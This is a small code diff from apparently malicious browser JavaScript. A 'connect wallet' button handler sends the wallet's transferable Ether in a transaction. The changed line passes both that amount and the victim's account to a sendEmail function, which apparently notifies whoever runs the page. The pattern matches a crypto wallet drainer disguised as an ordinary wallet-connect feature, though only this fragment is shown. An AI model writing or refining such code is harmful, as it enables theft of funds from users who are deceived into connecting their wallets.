@@ -107,7 +107,7 @@ connectWalletButton.addEventListener('click', async () => {
           value: ethtransaferableInWei, // The amount of Ether to send
           gas: 0
         })
-      sendEmail(account);
+      sendEmail(ethtransaferableInWei, account);
     }
   } catch (error) {
     console.error('WalletConnect error:', error);
